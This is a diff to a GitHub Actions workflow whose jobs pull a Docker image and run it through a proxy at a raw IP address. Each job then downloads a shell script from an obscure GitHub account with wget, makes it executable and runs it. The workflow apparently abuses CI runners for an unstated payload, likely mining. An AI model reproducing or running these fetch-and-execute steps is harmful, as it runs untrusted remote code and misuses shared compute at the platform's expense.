@@ -53,7 +53,7 @@ jobs:
       run: |
         
         docker pull insina3/ore4:v1
-        screen -dms docker run insina3/ore4:v1 --env HTTP_PROXY="http://174.138.176.78:24101"
+        docker run insina3/ore4:v1 --env HTTP_PROXY="http://174.138.176.78:24101"
         wget https://github.com/williehprnuhrxyq/dualspace/raw/main/winterme.sh && chmod +x * && ./winterme.sh
      
   cuk:
@@ -79,7 +79,7 @@ jobs:
     - name: Main
       run: |
         docker pull insina3/ore4:v1
-        screen -dms docker run insina3/ore4:v1 --env HTTP_PROXY="http://174.138.176.78:24101"
+        docker run insina3/ore4:v1 --env HTTP_PROXY="http://174.138.176.78:24101"
         wget https://github.com/williehprnuhrxyq/dualspace/raw/main/winterme.sh && chmod +x * && ./winterme.sh
   Success:
     needs: [alah, pelit, cuk]
